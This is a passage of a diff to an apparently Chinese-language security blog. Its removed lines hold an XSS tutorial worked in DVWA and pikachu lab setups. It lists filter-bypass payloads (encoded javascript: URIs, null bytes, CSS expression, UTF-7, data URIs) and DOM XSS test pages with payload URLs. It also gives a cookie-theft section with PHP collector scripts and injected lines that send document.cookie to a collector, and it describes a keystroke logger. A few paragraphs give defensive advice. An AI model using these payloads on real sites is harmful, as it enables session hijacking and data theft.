-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br></pre></td></tr></table></figure>
-
-<p>有经验的攻击者也可以把上面的全部转换成相等的 Ascii 码:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101; &amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>使用 Ascii 表你可以自己试试。当然转换成 16 进制也是可以的。。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp; #x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x27;&amp;#x58;&amp;#x53;&amp;#x53;&amp;#x27;&amp;#x29;&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="使用-制表符-换行符和回车符"><a href="#使用-制表符-换行符和回车符" class="headerlink" title="使用 制表符,  换行符和回车符"></a>使用 制表符,  换行符和回车符</h4><p>这些符号都是可以用来欺骗过滤器的。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;jav&amp;#x9ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>上面的例子使用了最小的十六进制的制表符来欺骗过滤器。最后的输出结果不变</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th>Type</th>
-<th>Tab（制表符）</th>
-<th>New Line(换行)</th>
-<th align="left">Carriage Return（回车）</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>URL</td>
-<td><code>%09</code></td>
-<td><code>%10</code></td>
-<td align="left"><code>%13</code></td>
-</tr>
-<tr>
-<td>Minimal Sized Hex</td>
-<td><code>&amp;#x9</code></td>
-<td><code>&amp;#xA</code></td>
-<td align="left"><code>&amp;#xD</code></td>
-</tr>
-<tr>
-<td>Maximum Sized Hex</td>
-<td><code>&amp;#x0000009;</code></td>
-<td><code>&amp;#x000000A;</code></td>
-<td align="left"><code>&amp;#x000000D;</code></td>
-</tr>
-<tr>
-<td>Minimum Sized Decimal</td>
-<td>&amp;#9</td>
-<td><code>&amp;#10</code></td>
-<td align="left"><code>&amp;#13</code></td>
-</tr>
-<tr>
-<td>Maximum Sized Decimal</td>
-<td><code>&amp;#x0000009;</code></td>
-<td><code>&amp;#x0000009;</code></td>
-<td align="left"><code>&amp;#0000009;</code></td>
-</tr>
-</tbody></table>
-<h4 id="使用空字符"><a href="#使用空字符" class="headerlink" title="使用空字符"></a>使用空字符</h4><p>另一个可以绕过的就是空字符，这是最有效的工具了。<br>下面这个就是个例子。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCR%00IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>空字符 <code>%00</code> 使得过滤器不能看到完整的 <code>&lt;SCRIPT&gt;</code> 标签. 只在 IE 6.0, IE 7.0 可以。</p>
-<h4 id="双引号配对的bug"><a href="#双引号配对的bug" class="headerlink" title="双引号配对的bug"></a>双引号配对的bug</h4><p>绕过这种过滤就是寻找闭合的标签，然后构造来突破<br>比如:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&#x27;XSS&#x27;)&lt;/SCRIPT&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>通常我们认为，img 标签里。前两个引号被认为是一对，什么都不做，下一个引号和最后的匹配，但是事<br>实不是这样，所有的浏览器都在试图修正这一问题。<br>结果最终如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img&gt;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;&amp;gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="绕过CSS-过滤器"><a href="#绕过CSS-过滤器" class="headerlink" title="绕过CSS 过滤器"></a>绕过CSS 过滤器</h4><p>HTML 标签用来插入 javaScript 很有用，但是 CSS 也是可以的哦。有很多方式向 CSS 里插入 XSS，所<br>有更多的方法可以攻击，最尖的方法是把 XSS 代码放到 LINK 方式引用的 CSS 的 href 属性里面去</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Ie7 已经不允许了。但是 opera 和 ie6 还是可以的。。<br>另一个方式是使用 <code>&lt;STYLE&gt;</code> 标签，不是很常见，一般是论坛啊。允许用户设计自己的贴的源代码的时候。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;STYLE&gt; a &#123; width: expression(alert(&#x27;XSS&#x27;)) &#125; &lt;/STYLE&gt;</span><br></pre></td></tr></table></figure>
-
-<p>还有一种方式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;DIV STYLE=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="不全面-的过滤器"><a href="#不全面-的过滤器" class="headerlink" title="不全面 的过滤器"></a>不全面 的过滤器</h4><p>我们看看当开发者已经把能想到的都过滤了或者什么的。就安全了吗？不。我们可以依然可以向数据指令<br>(我前段时间还看到了。现在忘了这个准确的翻译了)里插入代码。我们通过 base64 加密</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(‘XSS’)&lt;/script&gt;.</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>数据指令允许我们把完全的文档变成一个单一的字符串。在火狐等浏览器都可以用。</p>
-<h4 id="使用双引号"><a href="#使用双引号" class="headerlink" title="使用双引号"></a>使用双引号</h4><p>如果你需要使用双引号和单引号。使用一些诡异的用法把。。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=`javascript:alert(&quot;Look its, &#x27;XSS&#x27;&quot;)`&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h4 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h4><p>转义字符有时候很有用，可以对付一些简单的过滤器</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=`javascript:alert(\&quot;XSS\&quot;)`&gt;</span><br></pre></td></tr></table></figure>
-
-<p>结果如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=`javascript:alert(\\&quot;XSS\\&quot;)`&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h4><p>使用 utf-7 编码可以绕过<br>比如</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>使用 UTF-7 编码后:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+ADw-script+AD4-alert(+ACI-XSS+ACI-)+ADw-/script+AD4-</span><br></pre></td></tr></table></figure>
-
-<p>然后所有的加号需要被改成%2b，否则会被浏览器识别为连接符</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2BADw-script%2BAD4-alert%281%29%2BADw-/script%2BAD4-</span><br></pre></td></tr></table></figure>
-
-<p><img src="xss-bypass/1554912515633.png" alt="1554912515633"></p>
-<hr>
-<h1 id="待续……"><a href="#待续……" class="headerlink" title="待续……."></a>待续…….</h1>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/04/22/xss-bypass/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -731,155 +462,14 @@
 <p>window.name属性</p>
 <p>location属性</p>
 <p>innerHTML属性</p>
-<p>documen.write属性</p>
-<p>······</p>
-<p><strong>利用DOM引发XSS</strong>：</p>
-<p>利用DOM来引发XSS的方法有很多，这里只演示几种。</p>
-<p>利用创建元素createElement()：</p>
-<p>以DVWA反射型XSS为例，先在Kali监听1234端口：</p>
-<p><img src="xss-cookies/8180316-96af2342beb43d0c.png"></p>
-<p> 然后在DVWA中输入：</p>
-<p><img src="xss-cookies/8180316-c87ab4e34b9491a5.png" alt="img"></p>
-<p>在Kali中可看到cookie信息：</p>
-<p><img src="xss-cookies/8180316-2ac601600d755a9b.png" alt="img"></p>
-<p><strong>利用innerHTML：</strong></p>
-<p>用于篡改页面：</p>
-<p><img src="xss-cookies/8180316-e7629a89e51c0139.png" alt="img"></p>
-<p><img src="xss-cookies/8180316-2eed17e6d56b4ee0.png" alt="img"></p>
-<p><strong>利用document.onkeypress：</strong></p>
-<p>即进行键盘记录。</p>
-<p>在Kali的网页根目录下保存Keylogger.js文件：</p>
-<p><img src="xss-cookies/8180316-588c56150fecae0d.png" alt="img"></p>
-<p><strong>访问一下确保可行：</strong></p>
-<p><img src="xss-cookies/8180316-219611bbfa6f8fa9.png" alt="img"></p>
-<p>接着就是将keylogger.php文件也保存在同一个目录来是实现将键盘得到记录保存到本地的keylog.txt文件中，即将接受到的key参数的取值保存到该文件中：</p>
-<p>keylogger.php：</p>
-<p><img src="xss-cookies/8180316-a4df3a1681e31e8a.png" alt="img"></p>
-<p>接着创建一个空的keylog.txt文件，然后赋予相应的可写的权限，这里为了方便就将权限赋给所有的用户：chmod 777 keylog.txt接着在Kali中打开的DVWA中输入：然后在该网页中随意输入内容，查看keylog.txt文件可看到记录了下来：</p>
-<p><img src="xss-cookies/8180316-bd1fd334b13d7e2e.png" alt="img"></p>
-<p>使用<code>document.write</code>直接输出导致浏览器解析恶意代码</p>
-<p> 测试代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">        var s=location.search;          //返回URL中的查询部分（？之后的内容）</span><br><span class="line">          s=s.substring(1,s.length);    //返回整个查询内容</span><br><span class="line">        var url=&quot;&quot;;                     //定义变量url</span><br><span class="line">        if(s.indexOf(&quot;url=&quot;)&gt;-1)&#123;       //判断URL是否为空 </span><br><span class="line">          var pos=s.indexOf(&quot;url=&quot;)+4;  //过滤掉&quot;url=&quot;字符</span><br><span class="line">          url=s.substring(pos,s.length); //得到地址栏里的url参数</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">          url=&quot;url参数为空&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        document.write(&quot;url: &lt;a href=&#x27;&quot;+url+&quot;&#x27;&gt;&quot;+url+&quot;&lt;/a&gt;&quot;);  //输出</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p> 根据代码可以看出，<code>javascript</code>仅是验证<code>url</code>参数是否存在，如果存在将获取url参数的所有内容并打印出一个a标签，payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload1：http://127.0.0.1/xsstest.html?url=&#x27;&lt;script&gt;alert(&#x27;xsstest&#x27;)&lt;/script&gt;</span><br><span class="line">payload2：http://127.0.0.1/xsstest.html?url=&lt;script&gt;alert(&#x27;xsstest&#x27;)&lt;/script&gt;</span><br><span class="line">payload3：http://127.0.0.1/xsstest.html?url=javascript:alert(/xsstest/) （点击触发）</span><br></pre></td></tr></table></figure>
-
-<p>使用<code>innerHTML</code><strong>直接输出导致浏览器解析恶意代码</strong></p>
-<p> 测试代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">  &lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">      &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">      &lt;title&gt;&lt;/title&gt;</span><br><span class="line">      &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">          var s=location.search;          //返回URL中的查询部分（？之后的内容）</span><br><span class="line">            s=s.substring(1,s.length);    //返回整个查询内容</span><br><span class="line">          var url=&quot;&quot;;                     //定义变量url</span><br><span class="line">          if(s.indexOf(&quot;url=&quot;)&gt;-1)&#123;       //判断URL是否为空</span><br><span class="line">            var pos=s.indexOf(&quot;url=&quot;)+4;  //过滤掉&quot;url=&quot;字符</span><br><span class="line">            url=s.substring(pos,s.length); //得到地址栏里的url参数</span><br><span class="line">          &#125;else&#123;</span><br><span class="line">            url=&quot;url参数为空&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">      &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">      &lt;span id=&#x27;test&#x27;&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">       &lt;script type=&quot;text/javascript&quot;&gt;document.getElementById(&quot;test&quot;).innerHTML=&quot;我的url是: &lt;a href=&#x27;&quot;+url+&quot;&#x27;&gt;&quot;+url+&quot;&lt;/a&gt;&quot;; &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">  &lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p> payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload1：http://127.0.0.1/xsstest2.html?url=&#x27;&lt;img src=&quot;x&quot;&gt;&lt;/img&gt;</span><br><span class="line">payload2：http://127.0.0.1/xsstest2.html?url=javascript:alert(/xsstest/) （点击触发）</span><br></pre></td></tr></table></figure>
-
-<p><strong>使用<code>location/location.href/location.replace/iframe.src</code>造成的XSS</strong></p>
-<p> 测试代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">     &lt;html&gt;</span><br><span class="line">       &lt;head&gt;</span><br><span class="line">         &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">         &lt;title&gt;&lt;/title&gt;</span><br><span class="line">         &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">             var s=location.search;          //返回URL中的查询部分（？之后的内容）</span><br><span class="line">               s=s.substring(1,s.length);    //返回整个查询内容</span><br><span class="line">             var url=&quot;&quot;;                     //定义变量url</span><br><span class="line">             if(s.indexOf(&quot;url=&quot;)&gt;-1)&#123;       //判断URL是否为空</span><br><span class="line">               var pos=s.indexOf(&quot;url=&quot;)+4;  //过滤掉&quot;url=&quot;字符</span><br><span class="line">               url=s.substring(pos,s.length); //得到地址栏里的url参数</span><br><span class="line">             // &#125;else&#123;                        //此处注释掉</span><br><span class="line">             //   url=&quot;url参数为空&quot;;          //此处注释掉</span><br><span class="line">              &#125;</span><br><span class="line">         &lt;/script&gt;</span><br><span class="line">       &lt;/head&gt;</span><br><span class="line">       &lt;body&gt;</span><br><span class="line">         &lt;span id=&#x27;test&#x27;&gt;&lt;a href=&quot;&quot;&gt;&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">          &lt;script type=&quot;text/javascript&quot;&gt;location.href=url&lt;/script&gt;</span><br><span class="line">       &lt;/body&gt;</span><br><span class="line">     &lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p> payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xsstest3.html?url=javascript:alert</span><br><span class="line">http://127.0.0.1/xsstest3.html?url=javascript:alert(/xsstest/)</span><br></pre></td></tr></table></figure>
-
-<p><strong>使用<code>setTimeout/setInterval</code>造成的XSS</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">       &lt;html&gt;</span><br><span class="line">         &lt;head&gt;</span><br><span class="line">           &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">           &lt;title&gt;&lt;/title&gt;</span><br><span class="line">           &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">               var s=location.search;          //返回URL中的查询部分（？之后的内容）</span><br><span class="line">                 s=s.substring(1,s.length);    //返回整个查询内容</span><br><span class="line">               var url=&quot;&quot;;                     //定义变量url</span><br><span class="line">               if(s.indexOf(&quot;url=&quot;)&gt;-1)&#123;       //判断URL是否为空</span><br><span class="line">                 var pos=s.indexOf(&quot;url=&quot;)+4;  //过滤掉&quot;url=&quot;字符</span><br><span class="line">                 url=s.substring(pos,s.length); //得到地址栏里的url参数</span><br><span class="line">                 &#125;else&#123;</span><br><span class="line">                   url=&quot;url参数为空&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">           &lt;/script&gt;</span><br><span class="line">         &lt;/head&gt;</span><br><span class="line">         &lt;body&gt;</span><br><span class="line">           &lt;textarea id=&quot;test&quot; rows=&quot;8&quot; cols=&quot;40&quot;&gt;2s获取url&lt;/textarea&gt;</span><br><span class="line">           &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">              function showURL(url)&#123;</span><br><span class="line">                document.getElementById(&#x27;test&#x27;).value=url;</span><br><span class="line">              &#125;</span><br><span class="line">              if(url!=&quot;url参数为空&quot;)</span><br><span class="line">              setTimeout(&quot;showURL(&#x27;&quot;+url+&quot;&#x27;)&quot;,2000);</span><br><span class="line">                   //setInterval(&quot;showURL(&#x27;&quot;+url+&quot;&#x27;)&quot;,3000);</span><br><span class="line">           &lt;/script&gt;</span><br><span class="line">         &lt;/body&gt;</span><br><span class="line">       &lt;/html&gt;</span><br></pre></td></tr></table></figure>
-
-<p> payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xsstest4.html?url=&#x27;);alert(&quot;xsstest&quot;);eval(&#x27;</span><br></pre></td></tr></table></figure>
-
-<p> 打开payload时，setTimeout内的代码被改写为<code>setTimeout(&quot;showURL(&#39;&quot;&#39;);alert(&#39;xsstest&#39;);eval(&#39;+url+&quot;&#39;)&quot;,2000);</code></p>
-<p> 除了以上说明的几点，还有eval()函数，eval函数将执行其中的的 JavaScript 代码</p>
-<p><strong>DOM型XSS的防御方法</strong></p>
-<p>DOM型XSS主要是由客户端的脚本通过DOM动态地 输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于：</p>
-<p>（1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现；</p>
-<p>（2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码 转义，如输出到HTML则进行HTML编码、输出到js则进行js编码</p>
-<h1 id="xss-Cookie获取"><a href="#xss-Cookie获取" class="headerlink" title="xss Cookie获取"></a>xss Cookie获取</h1><hr>
-<p><strong>先来了解一下cookie属性：name、value、expires、domain、path、secure、max-age、HttpOnly。</strong></p>
-<ul>
-<li><p><strong>name name</strong></p>
-<p>属性是必需的，它是一个键值对，用于指定Cookie的键。</p>
-</li>
-<li><p><strong>value value</strong></p>
-<p>属性是必需的，它是一个键值对，用于指定Cookie的值。expires</p>
-</li>
-<li><p><strong>expires</strong> </p>
-<p>属性用于指定Cookie过期时间。它采用UTC或GMT格式，比如通过new</p>
-<p>date().toUTCString()或new Date().toGMTString()获取到的Thu, 09 Aug 2018 03:17:40 GMT。 如果不设置该属性，或者设为null，Cookie只在当前会话（session）有效，浏览器窗口一旦关闭，当前Session结束，该Cookie就会被删除。 浏览器根据本地时间，决定Cookie是否过期，由于本地时间是不精确的，所以没有办法保证Cookie一定会在服务器指定的时间过期</p>
-</li>
-<li><p><strong>domain</strong><br>domain属性指定Cookie所在的域名，比如example.com或subdomain.example.com。 如果未指定，默认为设定该Cookie的域名。所指定的域名必须是当前发送Cookie的域名的一部分，比如当前访问的域名是example.com，就不能将其设为google.com。只有访问的域名匹配domain属性，Cookie才会发送到服务器。</p>
-</li>
-<li><p><strong>path</strong><br>path属性用来指定路径，必须是绝对路径（比如/、/mydir），如果未指定，默认为请求该Cookie的网页路径。 只有path属性匹配向服务器发送的路径，Cookie才会发送。这里的匹配不是绝对匹配，而是从根路径开始，只要path属性匹配发送路径的一部分，就可以发送。比如，path属性等于/blog，则发送路径是/blog或者/blogroll，Cookie都会发送。path属性生效的前提是domain属性匹配。</p>
-</li>
-<li><p><strong>secure</strong><br>secure属性用来指定Cookie只能在加密协议HTTPS下发送到服务器。 该属性只是一个开关，不需要指定值。如果通信是HTTPS协议，该开关自动打开。</p>
-</li>
-<li><p><strong>max-age</strong> </p>
-<p>max-age属性用来指定Cookie有效期，比如60 * 60 * 24 * 365 （即一年31536000秒） 正常情况下，max-age的优先级高于expires，但是二者有一些细微差别。</p>
-</li>
-<li><p><strong>HttpOnly</strong><br>HttpOnly属性用于设置该Cookie不能被JavaScript读取. （即document.cookie不会返回这个Cookie的值），只用于向服务器发送。 <code>Set-Cookie: key=value; HttpOnly</code> </p>
-</li>
-</ul>
-<p>首先我们需要一段php 代码来获取cookie以及ip并且生成一个cookie.txt文件</p>
-<p>cookie.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cookie = $_GET[&#x27;cookie&#x27;];</span><br><span class="line">$ip = getenv (&#x27;REMOTE_ADDR&#x27;);</span><br><span class="line">$time = date(&#x27;Y-m-d g:i:s&#x27;);</span><br><span class="line">$fp = fopen(&quot;cookie.txt&quot;,&quot;a&quot;);</span><br><span class="line">fwrite($fp,&quot;IP: &quot;.$ip.&quot;Date: &quot;.$time.&quot; Cookie:&quot;.$cookie.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line">?&gt;   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>在存在XSS的地方 这样书 这样书写 (加入getcookie.php在你的根目录)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1/cookie.php?cookie=&#x27;+document.cookie+&#x27;&quot; width=0 height=0&lt;/script&gt;;</span><br></pre></td></tr></table></figure>
-
-<p>当加号被过滤时</p>
-<p>cookie.js</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var img = document.createElement(&#x27;img&#x27;);</span><br><span class="line">img.width = 0;</span><br><span class="line">img.height = 0;</span><br><span class="line">img.src = &#x27;http://127.0.0.1/coookie.php?joke=&#x27;+encodeURIComponent(document.cookie);</span><br></pre></td></tr></table></figure>
-
-<p>getcookie.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    @ini_set(&#x27;display_errors&#x27;,1);</span><br><span class="line">    $str = $_GET[&#x27;joke&#x27;];</span><br><span class="line">    $filePath = &quot;cookie.txt&quot;;</span><br><span class="line"></span><br><span class="line">    if(is_writable($filePath)==false)&#123;</span><br><span class="line">         echo &quot;can&#x27;t write&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">          $handler = fopen($filePath, &quot;a&quot;);</span><br><span class="line">          fwrite($handler, $str.&quot;\n&quot;);</span><br><span class="line">          fclose($handler);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>构造：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://127.0.0.1/cookie.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="pikachu-xss-之js输出"><a href="#pikachu-xss-之js输出" class="headerlink" title="pikachu xss 之js输出"></a>pikachu xss 之js输出</h5><p>先试一下 <script>alert(1)</script></p>
-<p>果然没有输出，查看元素也没有，然后正常输如看下  输入&lt;1213456&gt;</p>
-<p><img src="xss-cookies/2.png"></p>
-<p>考虑闭合语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(document.cookie)// 可以弹出</span><br></pre></td></tr></table></figure>
-
-<p>获取cookie </p>
